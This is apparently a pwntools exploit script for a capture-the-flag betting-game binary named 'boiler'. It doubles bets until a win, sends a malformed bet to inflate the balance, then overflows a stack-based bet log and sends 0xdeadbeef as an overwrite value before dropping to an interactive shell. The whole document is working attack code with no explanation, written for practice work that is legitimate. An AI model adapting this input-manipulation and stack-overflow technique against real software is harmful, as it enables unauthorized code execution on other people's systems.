from pwn import *

def get_balance():
	balance = 0
	lines = p.recvuntil("value:").strip().split(b"\n")
	print (lines)
	for l in lines:
		if (l.strip().startswith(b"Current Balance")):
			balance = int(l.strip().split(b"$")[-1].strip())
	return balance

p = process("./boiler")
print (p.recvuntil("name:"))
p.sendline("Aneesh!\n");
i = 100
bet_val = 5
counter = 0

cash = 20
p.recvuntil("value:")
p.sendline("%d" % bet_val)
res = p.recvline()
balance = 0

bet_count = 1
# double bet amount everytime till we win
while (b'win' not in res):
	bet_val = bet_val * 2
	lines = p.recvuntil("value:")
	lines = lines.split(b"\n")
	p.sendline("%d" % bet_val)
	res = p.recvline()
	cash = balance
	bet_count += 1

balance = get_balance()
print ("Balance: %d" % balance)

# make bet to make money infinite
p.sendline("%dm" % balance)
bet_count += 1

balance = get_balance()
print ("Current balance: %d" % balance);
bet_val = 5

# overflow the stack using bet log
while (bet_count < 105):
	p.sendline("%d" % bet_val)

	balance = get_balance()
	bet_val += 5
	bet_count += 1

p.sendline("%d" % 0xdeadbeef)
p.interactive()
